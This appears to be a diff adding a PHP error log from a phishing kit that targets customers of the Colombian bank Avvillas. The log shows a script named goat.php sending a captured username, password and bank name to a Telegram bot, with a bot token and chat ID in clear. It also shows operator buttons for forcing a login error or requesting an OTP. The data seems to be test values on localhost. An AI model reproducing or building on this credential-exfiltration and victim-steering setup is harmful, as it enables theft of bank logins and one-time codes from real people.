@@ -1,0 +1,33 @@
+Error: Array
+(
+    [type] => 2
+    [message] => file_get_contents(https://api.telegram.org/bot8310315205:AAEDfY0nwuSeC_G6l2hXzbRY2xzvAHNJYvQ/sendMessage): Failed to open stream: HTTP request failed! HTTP/1.1 400 Bad Request
+
+    [file] => C:\xampp\htdocs\panels\aire\pago\avvillas\process\goat.php
+    [line] => 78
+)
+Error Headers: Array
+(
+    [0] => HTTP/1.1 400 Bad Request
+    [1] => Server: nginx/1.18.0
+    [2] => Date: Fri, 09 Jan 2026 23:18:47 GMT
+    [3] => Content-Type: application/json
+    [4] => Content-Length: 191
+    [5] => Connection: close
+    [6] => Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+    [7] => Access-Control-Allow-Origin: *
+    [8] => Access-Control-Expose-Headers: Content-Length,Content-Type,Date,Server,Connection
+)
+
+Response: {"ok":false,"error_code":400,"description":"Bad Request: inline keyboard button URL 'http://localhost/panels/aire/updatetele.php?id=2&estado=2&key=secure_key_123' is invalid: Wrong HTTP URL"}
+Payload: Array
+(
+    [chat_id] => -5276576475
+    [text] => 🔐 *Nuevo inicio de sesión*
+
+👤 *Usuario:* `1223123321`
+🔑 *Clave:* `343434343434`
+🏦 *Banco:* `Avvillas`
+    [parse_mode] => MarkdownV2
+    [reply_markup] => {"inline_keyboard":[[{"text":"Error Login","url":"http:\/\/localhost\/panels\/aire\/updatetele.php?id=2&estado=2&key=secure_key_123"}],[{"text":"Otp","url":"http:\/\/localhost\/panels\/aire\/updatetele.php?id=2&estado=3&key=secure_key_123"},{"text":"Otp Error","url":"http:\/\/localhost\/panels\/aire\/updatetele.php?id=2&estado=4&key=secure_key_123"}],[{"text":"Finalizar","url":"http:\/\/localhost\/panels\/aire\/updatetele.php?id=2&estado=0&key=secure_key_123"}]]}
+)
